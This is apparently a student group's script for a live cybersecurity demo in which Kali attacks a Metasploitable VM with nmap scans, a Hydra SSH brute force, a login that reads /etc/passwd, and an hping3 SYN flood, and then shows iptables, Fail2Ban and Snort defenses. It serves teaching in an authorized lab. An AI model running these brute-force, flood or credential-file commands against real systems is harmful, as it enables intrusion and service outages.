# Group Presentation Demo Script & Walkthrough

## Cybersecurity Threat Analysis: Live Attack & Defense Demonstration

- **Total Duration:** 15–20 minutes
- **Format:** Live demo with narrated walkthrough
- **Setup:** Two screens visible — Attacker VM (left), Victim VM (right)

---

## Roles for a 4–5 Member Group

| Role                            | Responsibility                                                |
|---------------------------------|----------------------------------------------------------------|
| **Member 1 — Presenter/Narrator** | Introduces topic, transitions between phases, concludes      |
| **Member 2 — Attacker Operator**  | Operates the Kali Attacker VM, runs commands                 |
| **Member 3 — Victim/Defender**    | Operates the Victim VM, configures defenses                  |
| **Member 4 — Analyst**            | Explains what is happening, interprets output                |
| **Member 5 — Q&A Lead**           | Handles questions, supports with backup info                 |

---

## Pre-Demo Checklist (Do This 30 Minutes Before)

- [ ] Both VMs powered on and connected (`192.168.56.101 ↔ 192.168.56.102`)
- [ ] Test ping between both VMs
- [ ] Open all required terminals in advance
- [ ] Pre-load wordlists (`usernames.txt`, `passwords.txt`)
- [ ] Reset firewall rules to default (so live demo shows clean state)
- [ ] Prepare backup screenshots in case live demo fails
- [ ] Test Snort and Fail2Ban are working
- [ ] Increase terminal font size
- [ ] Disable any screen saver or lock timer

---

# Presentation Script

## Part 1: Introduction (2 minutes)

*Member 1 — Presenter*

> "Good morning everyone. We are Group [X], and today we will demonstrate
> how cyberattacks work in a real environment, and more importantly —
> **how to defend against them**.
>
> Our presentation has three parts:
>
> 1. We'll show you how an attacker gathers information about a target —
>    this is called **reconnaissance**.
> 2. We'll show how that information is used to **break into the system**
>    — known as an **access attack**.
> 3. We'll then show how to **detect and block these attacks** using
>    firewall, Fail2Ban, and Snort IDS.
>
> Our setup uses two virtual machines:
>
> - On the left: **Kali Linux Attacker VM** at IP `192.168.56.102`
> - On the right: **Metasploitable Victim VM** at IP `192.168.56.101`
>
> Let's begin."

---

## Part 2: Reconnaissance Phase (4 minutes)

*Member 4 narrates while Member 2 operates*

### Scene 1: Verify Connectivity

> "Before any attack, the attacker first checks whether the target is
> reachable."

```bash
ping -c 3 192.168.56.101
```

### Scene 2: Port and Service Scan

> "We use **Nmap**, the industry standard for network scanning."

```bash
nmap -sV 192.168.56.101
```

Highlight findings:

- Port 21 — FTP, vsftpd 2.3.4 (backdoor vulnerability)
- Port 22 — SSH, OpenSSH 4.7 (vulnerable to brute force)
- Port 80 — Apache 2.2.8 (outdated)
- Port 445 — Samba (multiple known CVEs)

### Scene 3: OS Detection

```bash
sudo nmap -O 192.168.56.101
```

> "Linux 2.6 — likely an old Ubuntu. This tells the attacker which
> exploits will work."

### Scene 4: Vulnerability Scanning

```bash
nmap --script=vuln 192.168.56.101
```

### Key Takeaway

> "After reconnaissance, the attacker has open ports, services,
> versions, OS, and known vulnerabilities — **without ever logging in**."

---

## Part 3: Access Attack Phase (4 minutes)

*Member 4 narrates while Member 2 attacks*

### Scene 5: Preparing the Brute Force

```bash
cat usernames.txt
cat passwords.txt
```

### Scene 6: Launch the Attack

```bash
hydra -L usernames.txt -P passwords.txt 192.168.56.101 ssh -t 4 -vV
```

> "Hydra found valid credentials — `msfadmin:msfadmin`."

### Scene 7: Gain Access

```bash
ssh msfadmin@192.168.56.101
whoami
hostname
ifconfig
cat /etc/passwd
```

> "We are now **inside** the victim machine. The attack took **less
> than 15 seconds**."

### Key Takeaway

> "Weak credentials are the **#1 cause of breaches** in real-world
> incidents. Strong passwords + multi-factor authentication would have
> stopped this attack."

---

## Part 4: DoS Attack (2 minutes)

### Scene 8: SYN Flood

Verify web server works:

```bash
curl http://192.168.56.101
```

Launch flood:

```bash
sudo hping3 -S --flood -p 80 192.168.56.101
```

On Victim VM:

```bash
top
```

Test responsiveness from a third terminal:

```bash
curl --max-time 5 http://192.168.56.101
```

> "The server is unresponsive. The Mirai Botnet attack on Dyn in 2016
> used exactly this technique to take down Twitter, Netflix, and
> Reddit for hours."

Stop with `Ctrl + C`.

---

## Part 5: Defense — Stopping the Attacks (5 minutes)

*Member 3 operates while Member 4 narrates*

### Scene 9: Defense 1 — Firewall (iptables)

```bash
sudo iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT
sudo iptables -A INPUT -p tcp --syn -j DROP

sudo iptables -A INPUT -p icmp -m limit --limit 1/s -j ACCEPT
sudo iptables -A INPUT -p icmp -j DROP

sudo iptables -L -v -n
```

### Scene 10: Test the Firewall

Re-launch SYN flood from attacker, then check service:

```bash
curl http://192.168.56.101
```

Web server still responds.

### Scene 11: Defense 2 — Fail2Ban (SSH Protection)

```bash
sudo systemctl status fail2ban
sudo fail2ban-client status sshd
```

### Scene 12: Test Fail2Ban

Attacker:

```bash
hydra -L usernames.txt -P passwords.txt 192.168.56.101 ssh -t 4
```

Victim verification:

```bash
sudo fail2ban-client status sshd
```

Output shows banned IP `192.168.56.102`.

```bash
ssh msfadmin@192.168.56.101
```

Connection times out — attacker is blocked.

### Scene 13: Defense 3 — Snort IDS

```bash
sudo snort -A console -q -c /etc/snort/snort.conf -i enp0s8
```

### Scene 14: Test Snort

Unban for testing:

```bash
sudo fail2ban-client set sshd unbanip 192.168.56.102
```

Attacker:

```bash
nmap -sS 192.168.56.101
```

Snort prints alerts:

```text
[**] [1:1000001:1] NMAP SYN Scan Detected [**]
[Priority: 0] {TCP} 192.168.56.102:54321 -> 192.168.56.101:22
```

---

## Part 6: Before vs. After Comparison (1 minute)

| Attack          | Before Defense          | After Defense                       |
|-----------------|--------------------------|-------------------------------------|
| Nmap Scan       | Full info exposed        | Detected by Snort + rate limited    |
| SSH Brute Force | Cracked in 12 sec        | IP banned after 3 attempts          |
| SYN Flood       | Web server down          | Web server stays online             |
| ICMP Flood      | CPU spikes to 95%        | Traffic dropped at firewall         |

> "Every attack we demonstrated was prevented, slowed, or detected by
> our defense layers. This is **defense in depth**."

---

## Part 7: Key Lessons & Recommendations (1 minute)

1. **Reconnaissance is silent** — attackers can map your network unnoticed.
2. **Weak passwords are deadly** — cracked in seconds.
3. **DoS attacks are easy to launch** but mitigatable with proper firewalls.
4. **Defense-in-depth works** — firewall + Fail2Ban + IDS together stop most attacks.
5. **Detection matters as much as prevention.**

Recommendations:

- Strong passwords + MFA
- Patch and update systems regularly
- Disable unused services
- Implement firewall + IDS + Fail2Ban
- Conduct regular security audits

---

## Part 8: Q&A (2 minutes)

**Q: Why use Metasploitable as the victim?**
> Intentionally vulnerable Linux distribution from Rapid7 designed for
> security training; safe and legal to attack in a lab.

**Q: Can these attacks work on real networks?**
> Yes — but only on poorly secured systems. Patched and properly
> configured systems would resist most of these attacks.

**Q: What if the attacker uses different IPs?**
> Need additional layers: geo-blocking, behavioral analysis, and SIEM
> tools that correlate logs across sources.

**Q: How realistic is this scenario?**
> Very. The 2017 WannaCry attack and 2016 Mirai botnet used similar
> techniques on a massive scale.

**Q: Difference between IDS and IPS?**
> IDS only **alerts**. IPS actively **blocks** the attack. Snort can
> run in either mode.

**Q: Is brute forcing illegal?**
> Yes, against systems you don't own. Our demonstration is in a
> controlled lab with full authorization.

---

## Part 9: Closing (30 seconds)

> "Cybersecurity isn't about a single tool or technique. It's about
> **layered defenses, constant vigilance, and understanding the
> attacker's mindset**. Thank you for watching."

---

## Backup Plan (If Live Demo Fails)

1. Apologize briefly: "We're experiencing a small technical issue."
2. Switch to backup screenshots/video.
3. Continue narrative as planned.

Pre-record a backup video using OBS Studio or screen recording.

---

## Presentation Timing Checklist

| Phase                  | Duration | Cumulative |
|------------------------|----------|------------|
| Introduction           | 2 min    | 2 min      |
| Reconnaissance         | 4 min    | 6 min      |
| Access Attack          | 4 min    | 10 min     |
| DoS Attack             | 2 min    | 12 min     |
| Defense Setup          | 5 min    | 17 min     |
| Comparison & Lessons   | 1 min    | 18 min     |
| Q&A                    | 2 min    | 20 min     |

---

## Presentation Tips

### Voice & Delivery

- Speak slowly and clearly when commands are running
- Pause 2–3 seconds after each result so the audience can read
- Use confident phrasing: "Look here…" "Notice that…" "This proves…"

### Screen Setup

- Two monitors if possible (Attacker on one, Victim on the other)
- Increase terminal font size to at least 16pt
- Use a dark terminal background for contrast
- Close distracting windows and notifications

### Group Coordination

- Practice end-to-end at least twice
- Designate a timekeeper
- Use a signal between members for transitions

### Engagement

- Ask the audience: "Can anyone guess what happens next?"
- Use analogies: "A firewall is like a security guard at a building entrance."
- Reference current events: e.g., the Colonial Pipeline ransomware attack.

---

## Files to Prepare for the Demo

```text
demo_files/
├── usernames.txt              # Brute force username list
├── passwords.txt              # Brute force password list
├── recon_commands.txt         # Pre-written commands to copy
├── attack_commands.txt        # Pre-written commands to copy
├── defense_commands.txt       # Pre-written defense commands
├── backup_screenshots/        # Backup images if live demo fails
├── backup_video.mp4           # Recorded fallback video
└── presentation_slides.pptx   # Supporting slides
```

---

## Final Tips for Success

1. Practice at least 3 times with the full team.
2. Test everything 1 hour before — VMs, network, commands.
3. Prepare backup screenshots for every command.
4. Stay calm if something fails — recover smoothly and move on.
5. Engage the audience with eye contact, gestures, and questions.
6. End strong — your conclusion is what people remember.
